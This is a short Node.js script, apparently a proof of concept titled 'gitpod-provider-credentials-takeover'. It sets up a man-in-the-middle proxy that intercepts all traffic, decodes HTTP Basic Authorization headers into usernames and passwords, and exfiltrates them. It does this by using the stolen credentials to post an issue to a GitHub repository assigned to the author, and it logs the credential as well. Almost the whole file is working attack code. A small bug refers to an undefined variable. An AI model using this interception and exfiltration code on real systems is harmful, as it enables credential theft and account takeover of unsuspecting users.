const stream = require('stream')
const MitmProxy = require('@pureproxy/mitmproxy')
var credentials = false

const server = new class extends MitmProxy {
  wrapClientForObservableStreaming(client, { hostname, port, context }) {
    // return a duplex stream (like sockets) to monitor all data in transit
 
    return new class extends stream.Duplex {
      constructor() {
        super()
 
        client.on('data', (data) => {
          // log incoming data
          this.push(data)
        })
      }
 
      _write(data, encoding, callback) {
        // log outgoing data
        let payload = data.toString('utf8')
        
        payload.split('\n').forEach(content => {
            if (content.startsWith('Authorization')) {
                try {
                 
                    if (credentials) {
                        process.exit(1);
                    }
                    
                    let basicAuth =  Buffer.from(content.replace('Authorization: Basic ', ''), 'base64').toString('utf8').split(':')
                    
                    credentials = { 
                        target: client._host || client._parent._host,
                        user: decodeURI(basicAuth[0]), 
                        password: decodeURI(basicAuth[1]) 
                    }

                    require('request').post({
                        headers: { 'content-type' : 'application/json',
                                   'user-agent': 'request' },
                        url: `https://${basicAuth[0]}:${basicAuth[1]}@api.github.com/repos/gerardo-junior/gitpod-provider-credentials-takeover/issues`,
                        body: JSON.stringify({ 
                            title: 'I got a valid token from you!',
                            body: 'this is a return to click to open issue on gitpod',
                            assignee: 'gerardo-junior' 
                        })
                    }, function(error, response, body){
                        console.log(body);
                    });
        
                    console.log('I got a credential:', credential)

                } catch (err) {
                    console.error(err)
                }
                
            }
        })

        client.write(data)
 
        callback()
      }
 
      _read() {}
    }
  }
 
  shouldIntercept(hostname, port, context) {
    return true
  }
}
 
server.listen(8080)
